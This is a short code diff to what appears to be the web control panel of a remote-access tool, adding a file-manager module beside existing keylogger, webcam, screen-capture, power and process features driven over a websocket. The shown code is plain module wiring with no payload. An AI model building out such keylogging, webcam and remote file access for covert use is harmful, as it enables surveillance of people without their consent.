@@ -9,6 +9,7 @@ import { ScreenCaptureManager } from './features/screen.js';
 import { KeyloggerManager } from './features/keylogger.js';
 import { WebcamManager } from './features/webcam.js';
 import { PowerManager } from './features/power.js';
+import { FileManagerManager } from './features/filemanager.js';
 import { parseQueryString, preventSpaceKeyOnButtons } from './utils/helpers.js';
 
 class Application {
@@ -35,6 +36,7 @@ class Application {
         this.keylogger = new KeyloggerManager(this.ws, this.logger);
         this.webcam = new WebcamManager(this.ws, this.logger);
         this.power = new PowerManager(this.ws, this.logger);
+        this.filemanager = new FileManagerManager(this.ws, this.logger);
         
         this.setupGlobalListeners();
         this.ws.connect();
@@ -86,6 +88,8 @@ class Application {
             this.apps.refresh();
         } else if (currentTab === 'processes') {
             this.processes.refresh();
+        } else if (currentTab === 'files') {
+            this.filemanager.refresh();
         }
     }
 
